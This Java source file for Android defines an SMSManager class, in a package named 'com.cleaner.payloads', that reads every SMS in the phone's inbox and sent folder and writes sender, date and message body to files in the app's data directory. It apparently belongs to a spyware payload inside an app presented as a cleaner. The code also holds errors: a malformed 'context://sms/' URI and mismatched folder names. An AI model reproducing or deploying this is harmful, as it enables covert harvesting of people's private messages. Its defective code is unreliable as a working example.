package com.cleaner.payloads;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class SMSManager {
    /**
     * The method receives two types of SMS and automatically saves them
     * @param context context
     * @param file the name that will be used when saving the SMS
     * @param box for example - context.getApplicationInfo().dataDir + "/sms_inbox";
     */
    private void dumpSMS(Context context, String file, String box) {
        SimpleDateFormat formatter = new SimpleDateFormat("yyyy.MM.dd HH:mm:ss", Locale.UK);
        Cursor cursor = context.getContentResolver().query(Uri.parse("context://sms/" + box),
                null, null, null, null);
        try {
            PrintWriter pw = new PrintWriter(file);

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String address = null;
                    String date = null;
                    String body = null;

                    for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                        switch (cursor.getColumnName(idx)) {
                            case "address":
                                address = cursor.getString(idx);
                                break;
                            case "date":
                                date = cursor.getString(idx);
                                break;
                            case "body":
                                body = cursor.getString(idx);
                                break;
                        }
                    }

                    if (box.equals("inbox")) {
                        pw.println("From: " + address);
                    } else {
                        pw.println("To: " + address);
                    }

                    String dateString = formatter.format(new Date(Long.parseLong(date)));
                    pw.println("Date:" + dateString);

                    if (body != null) {
                        pw.println("Body: " + body.replace('\n', ' '));
                    } else {
                        pw.println("Body: null");
                    }

                    pw.println();
                } while (cursor.moveToNext());
            }

            pw.close();

            if (cursor != null) {
                cursor.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
            Log.d("SMSManager.dumpSMS:", "unknown exception");
        }
    }


    /**
     * @param context context
     * The saveSMS method already implies an SMS dump,
     * you can use it without fear of getting an exception
     */
    public void saveSMS(Context context) {
        String inboxFile = context.getApplicationInfo().dataDir + "/sms_inbox";
        dumpSMS(context, inboxFile, "SMS_inbox");
        String sentFile = context.getApplicationInfo().dataDir + "/sms_sent";
        dumpSMS(context, sentFile, "SMS_sent");
    }
}
